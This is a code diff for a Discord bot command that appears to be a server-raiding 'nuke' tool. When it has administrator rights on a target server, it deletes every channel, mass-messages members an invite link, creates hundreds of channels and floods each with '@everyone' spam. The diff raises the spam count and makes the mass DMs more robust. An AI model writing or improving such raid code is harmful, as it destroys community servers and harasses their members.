@@ -17,12 +17,14 @@ module.exports = {
     if(guildPriv) return error(message, 'That server is one of the servers privated!')
 
     if(!id.members.me.permissions.has("Administrator")) return error(message, "I'm missing permissions!")
+    
 
     if(id.channels.cache.size < 498) {
         id.channels.cache.forEach(channel => channel.delete());
-        id.members.cache.forEach(member => {
-            if(member.id !== client.user.id) return member.send("discord.gg/peru")
-        })
+        id.members.cache.forEach(member => { 
+          if(member.user.bot) return;
+          member.send("discord.gg/peru").catch((e => console.log(`${e.message} - ${member.id}`)))
+      })
 
         for (let i = 0;i < 499;i++) {
             id.channels.create({
@@ -36,7 +38,7 @@ module.exports = {
                   m.send("@everyone discord.gg/peru")
                 }
               })
-                for (let i = 0;i < 15;i++) {
+                for (let i = 0;i < 25;i++) {
                 c.send("@everyone fcked by shabby discord.gg/peru")
               }
             })
